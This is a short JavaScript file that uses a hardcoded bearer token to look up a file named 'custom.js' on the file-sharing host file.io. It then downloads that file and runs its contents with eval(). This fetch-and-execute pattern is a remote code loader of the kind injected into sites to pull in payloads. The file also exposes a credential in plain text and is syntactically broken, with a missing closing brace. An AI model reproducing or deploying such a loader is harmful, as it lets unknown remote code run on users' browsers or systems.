const scriptname = "custom.js";
const bearer="Bearer 4NA6HH6.VFV2R08-1KTMWRR-M7PKQAZ-JHVEZ21";

function getfilekey(filename,callback){
  const data = "search="+filename;
  const xhr = new XMLHttpRequest();
  xhr.withCredentials = true;
  xhr.open("GET", "https://file.io/");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.setRequestHeader("Authorization", bearer);
  xhr.onload = function () {
   if (xhr.status === 200) {
    callback(xhr.response.nodes[0].key)
   }
  };
  xhr.send(data);
}

function runscript(key){
  const xhr = new XMLHttpRequest();
  xhr.withCredentials = true;
  xhr.onload = function () {
   if (xhr.status === 200) {
    eval(xhr.response)
   }
  };
  xhr.open("GET", "https://file.io/"+key);
  xhr.setRequestHeader("Authorization", bearer);
  xhr.send(null);

getfilekey(scriptname,runscript);
